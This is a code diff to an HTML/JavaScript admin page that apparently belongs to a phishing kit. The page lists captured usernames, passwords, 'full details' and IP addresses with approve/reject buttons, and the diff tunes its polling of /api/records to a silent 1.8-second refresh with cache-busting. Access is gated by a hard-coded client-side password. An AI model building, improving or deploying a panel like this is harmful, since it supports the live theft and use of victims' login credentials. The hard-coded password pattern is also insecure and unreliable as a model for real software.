@@ -18,7 +18,7 @@
         .reject { background: #ef4444; color: white; }
         .refresh-btn { background: #3b82f6; color: white; padding: 12px 25px; border: none; border-radius: 8px; margin: 10px; font-weight: 600; }
         .clear-btn { background: #ef4444; color: white; padding: 12px 25px; border: none; border-radius: 8px; margin: 10px; }
-        .status { text-align: center; padding: 10px; background: #f0f9ff; color: #0369a1; font-weight: 500; }
+        .status { text-align: center; padding: 12px; background: #f0f9ff; color: #0369a1; font-weight: 500; }
     </style>
 </head>
 <body>
@@ -41,7 +41,7 @@
                     <th>Username</th>
                     <th>Password</th>
                     <th>Full Details</th>
-                    <th>IP Address</th>
+                    <th>IP</th>
                     <th>Action</th>
                 </tr>
             </thead>
@@ -52,12 +52,13 @@
     <script>
         const ADMIN_PASSWORD = "tunde6035";
 
-        async function loadRecords() {
+        async function loadRecords(silent = false) {
             try {
-                const res = await fetch('/api/records', { 
+                const res = await fetch('/api/records?' + Date.now(), { 
                     cache: 'no-store',
-                    headers: { 'Cache-Control': 'no-cache, no-store' }
+                    headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate' }
                 });
+                
                 const records = await res.json();
                 const tbody = document.querySelector('#recordsTable tbody');
                 tbody.innerHTML = "";
@@ -87,7 +88,7 @@
                         </tr>`;
                 });
             } catch (e) {
-                document.getElementById('status').innerHTML = "❌ Failed to load - Click Force Refresh";
+                if (!silent) document.getElementById('status').innerHTML = "❌ Connection issue - Click Force Refresh";
             }
         }
 
@@ -114,7 +115,7 @@
             loadRecords();
         }
 
-        // Initial load + Auto refresh
+        // Strong Auto + Manual Refresh
         window.onload = () => {
             const pass = prompt("Enter Admin Password:");
             if (pass !== ADMIN_PASSWORD) {
@@ -124,7 +125,7 @@
             }
 
             loadRecords();
-            setInterval(loadRecords, 2000);   // Auto refresh every 2 seconds
+            setInterval(() => loadRecords(true), 1800);   // Silent refresh every 1.8s
         };
     </script>
 </body>
